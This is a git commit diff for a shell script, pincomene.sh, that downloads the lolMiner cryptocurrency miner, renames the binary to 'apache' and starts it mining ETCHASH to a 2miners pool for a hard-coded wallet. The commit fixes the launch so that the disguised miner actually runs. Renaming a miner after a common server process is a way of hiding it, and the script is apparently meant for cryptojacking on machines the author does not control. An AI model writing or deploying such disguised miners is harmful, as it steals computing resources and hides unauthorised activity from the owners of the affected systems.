47ac3270a14ac615904df5d156b63d1ce2f52a01
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-09-12 11:13:40 +0700

    Update and rename pincomen.sh to pincomene.sh

--- pincomene.sh
+++ pincomene.sh
@@ -14,5 +14,6 @@ cd ..
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
 tar -xf lolMiner_v1.51_Lin64.tar.gz
 cd 1.51
-mv lolMiner ../apache --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
-
+mv lolMiner ../apache
+cd ..
+./apache --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
